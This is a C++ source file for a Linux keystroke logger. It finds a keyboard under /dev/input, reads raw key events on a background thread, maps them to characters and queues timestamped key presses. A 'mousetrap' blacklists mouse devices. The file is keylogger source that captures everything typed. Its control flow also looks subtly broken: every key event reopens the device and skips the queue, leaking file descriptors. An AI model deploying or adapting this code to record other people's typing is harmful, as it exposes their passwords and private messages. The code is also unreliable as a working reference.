// logger.cpp

#include "logger.h"

#include <linux/input-event-codes.h>
#include <nlohmann/json.hpp>
#include <sys/stat.h>
#include <sys/types.h>

#include <array>
#include <cassert>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <unistd.h>
#include <utility>

logger& logger::get_instance(tsq& queue) {
	static logger instance(queue);
	return instance;
}

logger::logger(tsq& queue)
: fd_(-1)
, initialized_(false)
, running_(false)
, keymap_(load_keymap("keymap.json"))
, q_(queue) {}

logger::~logger() { kill(); }

auto logger::init(const std::string& event_ID) -> bool {
	if (check_init()) {
		MSG(messagetype::error, "logger (init): logger already initialized.");
		return false;
	}

	auto const device = event_ID.empty() ? find_kbd() : event_ID;
	if (device.empty()) {
		MSG(messagetype::error, "logger (init): no viable keyboard device found.");
		return false;
	}

	fd_ = open(device.c_str(), O_RDONLY | O_NONBLOCK);
	if (fd_ == -1) {
		MSG(messagetype::error, "logger (init): failed to open device.");
		return false;
	}

	initialized_ = true;
	ev_init_     = device;

	MSG(messagetype::info, "logger (init): initialized");
	return true;
}

auto logger::check_init() const -> bool { return initialized_; }

auto logger::start() -> void {
	if (!check_init()) {
		MSG(messagetype::error, "logger (start): logger not initialized.");
		return;
	}
	if (running_) {
		MSG(messagetype::warning, "logger (start): logger already running.");
		return;
	}

	running_ = true;

	if (work_.joinable()) {
		MSG(messagetype::debug, "logger (start): joining worker thread.");
		work_.join();
	}

	work_ = std::thread(&logger::ev_reader, this);
	MSG(messagetype::info, "logger (start): logger processing thread started.");
}

auto logger::kill() -> void {
	running_ = false;
	if (fd_ != -1) {
		close(fd_);
		fd_ = -1;
	}
	if (work_.joinable()) {
		work_.join();
	}
	initialized_ = false;
	ev_init_.clear();
	MSG(messagetype::debug, "logger (kill): logger killed.");
}

auto logger::
  load_keymap(const std::string& config) -> std::unordered_map<unsigned int, std::pair<std::string, std::string>> {
	auto tmp  = std::unordered_map<unsigned int, std::pair<std::string, std::string>>{};
	auto conf = std::ifstream(config);

	if (!conf.is_open()) {
		MSG(messagetype::error, "logger (load_keymap): keymap config error.");
		return tmp;
	}

	auto keyconfig = nlohmann::json{};
	conf >> keyconfig;

	for (auto& [key, val] : keyconfig.items()) {
		auto code = std::stoi(key);
		auto name = std::string{val[0]};
		auto ch   = std::string{val[1]};
		tmp.emplace(code, std::make_pair(name, ch));
	}
	return tmp;
}

auto logger::fd_monitor(signed int fd, fd_set& fds) -> signed int {
	struct timeval timeout {
		1, 0
	};

	FD_ZERO(&fds);
	FD_SET(fd, &fds);

	auto const retval = select(fd + 1, &fds, nullptr, nullptr, &timeout);
	if (retval == -1) {
		MSG(messagetype::error, "logger (fd_monitor): select error.");
	}

	return retval;
}

auto logger::datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
	auto date = std::array<char, 11>{};
	auto time = std::array<char, 9>{};

	std::tm* tv = std::localtime(&tv_sec);
	std::strftime(date.data(), date.size(), "%Y-%m-%d", tv);
	std::strftime(time.data(), time.size(), "%H:%M:%S", tv);

	return std::make_pair(std::string{date.data()}, std::string{time.data()});
}

auto logger::find_kbd() -> std::string {
	auto const dev_input = "/dev/input";
	if (!std::filesystem::exists(dev_input)) {
		MSG(messagetype::error, "logger (find_kbd): directory not found.");
		return "";
	}
	if (!std::filesystem::is_directory(dev_input)) {
		MSG(messagetype::error, "logger (find_kbd: compiled input directory is not a directory.");
		return "";
	}

	for (const auto& event_num : std::filesystem::directory_iterator(dev_input)) {
		auto const& path = event_num.path();
		if (path.filename().string().find("event") == 0) {
			auto const resolved_path = path.string();
			MSG(messagetype::debug, "logger (find_kbd): attempting device " + resolved_path);

			auto fd = open(resolved_path.c_str(), O_RDONLY | O_NONBLOCK);
			if (fd == -1) {
				MSG(messagetype::debug, "logger (find_kbd): file descriptor error.");
				continue;
			}

			fd_set fds;
			FD_ZERO(&fds);
			auto retval = fd_monitor(fd, fds);
			if (retval > 0 && FD_ISSET(fd, &fds)) {
				close(fd);
				MSG(messagetype::info, "logger (find_kbd): found working input device at " + resolved_path);
				return resolved_path;
			}
			MSG(messagetype::debug, "logger (find_kbd): device non-responsive: " + resolved_path);
			close(fd);
		}
	}
	MSG(messagetype::error, "logger (find_kbd): no viable keyboard device.");
	return "";
}

auto logger::ev_reader() -> void {
	MSG(messagetype::info, "logger (ev_reader): ev_reader loop started.");
	auto ev = input_event{};
	while (running_) {
		fd_set fds;
		auto   retval = fd_monitor(fd_, fds);
		if (retval == -1) {
			MSG(messagetype::error, "logger (ev_reader): select error.");
			break;
		}
		if (retval > 0 && FD_ISSET(fd_, &fds)) {
			auto n = read(fd_, &ev, sizeof(ev));
			if (n == -1) {
				if (errno == EAGAIN || errno == EWOULDBLOCK) {
					continue;
				}
				else {
					MSG(messagetype::error, "logger (ev_reader): read error.");
					break;
				}
			}
			MSG(messagetype::debug,
			    "logger (ev_reader): read " + std::to_string(n) + " bytes, ev.type = " + std::to_string(ev.type) +
			      ", ev.code = " + std::to_string(ev.code) + ", ev.value = " + std::to_string(ev.value));

			if (n == static_cast<ssize_t>(sizeof(ev)) && ev.type == EV_KEY) {
				// mousetrap
				if (ev.code >= 272 && ev.code <= 274) {
					MSG(messagetype::warning, "logger (ev_reader): mousetrap triggered. " + ev_init_ + " blacklisted.");
					close(fd_);
					fd_ = -1;
					blacklist_.insert(ev_init_);
					ev_init_.clear();
					ev_init_ = find_kbd();
				}

				fd_ = open(ev_init_.c_str(), O_RDONLY | O_NONBLOCK);
				if (fd_ == -1) {
					MSG(messagetype::error, "logger (ev_reader): file descriptor error.");
					running_ = false;
					break;
				}
				MSG(messagetype::info, "logger (ev_reader): switched to new device: " + ev_init_);
				continue;
			}

			auto  dtg      = datetime(ev.time.tv_sec);
			auto  key_char = get_keychar(ev.code);
			event e{dtg.first, dtg.second, key_char, ev.value ? true : false};
			if (ev.value == true) {
				MSG(messagetype::info, "logger (ev_reader): pushing event to queue: key = " + e.key);
				q_.push(e);
			}
			else if (ev.value == false) {
				MSG(messagetype::info, "logger (ev_reader): discarding key unpress: key = " + e.key);
			}
		}
	}
	MSG(messagetype::info, "logger (ev_reader): ev_reader loop terminate.");
}

auto logger::get_keychar(unsigned int code) -> std::string {
	auto it = keymap_.find(code);
	if (it == keymap_.end()) {
		MSG(messagetype::warning, "logger (get_keychar): unknown key code: " + std::to_string(code));
		return "<unknown>";
	}
	return it->second.second;
}
